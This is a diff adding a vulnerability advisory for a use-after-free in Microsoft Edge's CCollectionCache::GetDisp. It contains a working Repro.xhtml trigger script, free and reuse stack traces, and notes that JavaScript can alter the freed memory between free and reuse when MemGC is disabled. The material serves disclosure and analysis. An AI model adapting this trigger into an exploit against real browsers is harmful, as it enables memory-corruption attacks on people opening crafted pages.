@@ -1,0 +1,78 @@
+1300k - Microsoft Edge CCollectionCache::GetDisp use-after-free
+=====================================
+
+Synopsis
+--------
+Specially crafted HTML can trigger a use-after-free in Microsoft Edge if MemGC
+is disabled.
+
+Known affected software and attack vectors
+------------------------------------------
++ Microsoft Edge 20.10240.16384.0
+  An attacker would need to get a target user to open a specially crafted
+  webpage. JavaScript appears to be required to trigger the issue.
+
+Repro.xhtml
+-----------
+    <script xmlns="http://www.w3.org/1999/xhtml"><![CDATA[
+      setTimeout(function () {
+        var oImage = new Image();
+        var oChildCollection = oImage.children;
+        oImage.textContent = "Z";
+        oImage.firstChild;
+        setTimeout(function() {
+          oImage.innerHTML = "<a></a>";
+          oChildCollection.namedItem(undefined);
+          oImage.textContent = ""; // free, can be changed to innerHTML = "";
+          // opportunity to modifiy freed memory
+          oChildCollection.item(0); // reuse
+        });
+        oImage.outerHTML = "\1";
+      });
+    ]]></script>
+
+Description
+-----------
+Free stack using "textContent" in repro:
+EDGEHTML!MemoryProtection::HeapFree+0x2a65e8
+EDGEHTML!CAnchorElement::`vector deleting destructor'+0x046
+EDGEHTML!CBase::PrivateRelease+0x22f
+EDGEHTML!CSpliceRecordList::~CSpliceRecordList+0x0fe
+EDGEHTML!CSpliceTreeEngine::~CSpliceTreeEngine+0x119
+EDGEHTML!Tree::TreeWriter::RemoveNode+0x255
+EDGEHTML!CElement::MoveToSeparateMarkup+0x516d59
+EDGEHTML!CElement::PutTextContentHelper+0x07e
+EDGEHTML!CElement::put_textContent+0x050
+EDGEHTML!CDOMNode::Var_set_textContent+0x060
+EDGEHTML!CFastDOM::CNode::Trampoline_Set_textContent+0x071
+
+Free stack using "innerHTML" in repro:
+EDGEHTML!MemoryProtection::HeapFree+0x2a65e8
+EDGEHTML!CAnchorElement::`vector deleting destructor'+0x046
+EDGEHTML!CBase::PrivateRelease+0x22f
+EDGEHTML!CSpliceRecordList::~CSpliceRecordList+0x0fe
+EDGEHTML!CSpliceTreeEngine::~CSpliceTreeEngine+0x119
+EDGEHTML!Tree::TreeWriter::SpliceTreeInternal+0x160
+EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy+0x5a1
+EDGEHTML!Tree::STextRange::Remove+0x11e
+EDGEHTML!Tree::TreeWriter::RemoveReferencedSubtreesInRangeIntoOrphanedMarkups+0x46b
+EDGEHTML!RemoveWithBreakOnEmpty+0x0c7
+EDGEHTML!CElement::InjectInternal+0x4f4
+EDGEHTML!CElement::InjectTextOrHTML+0x0e8
+EDGEHTML!CFastDOM::CHTMLElement::Trampoline_Set_innerHTML+0x08c
+
+Reuse stack:
+EDGEHTML!CCollectionCache::GetDisp+0xd1
+EDGEHTML!CCollectionCache::Item+0xd7
+EDGEHTML!CElementCollection::item+0x43
+EDGEHTML!CFastDOM::CHTMLCollection::Trampoline_item+0xf4
+
+Exploit
+-------
+From the free & reuse stack, it appears that setting the innerHTML or
+textContent of the Image object frees the memory and the call to item() re-uses
+it. It is possible to execute JavaScript in between the free and re-use, and an
+attacker can therefore modify the contents of the memory between free and reuse.
+The code does appear to do additional checks on the memory to mitigate
+use-after-free exploitation. Either way, no one runs Edge with MemGC
+disabled.
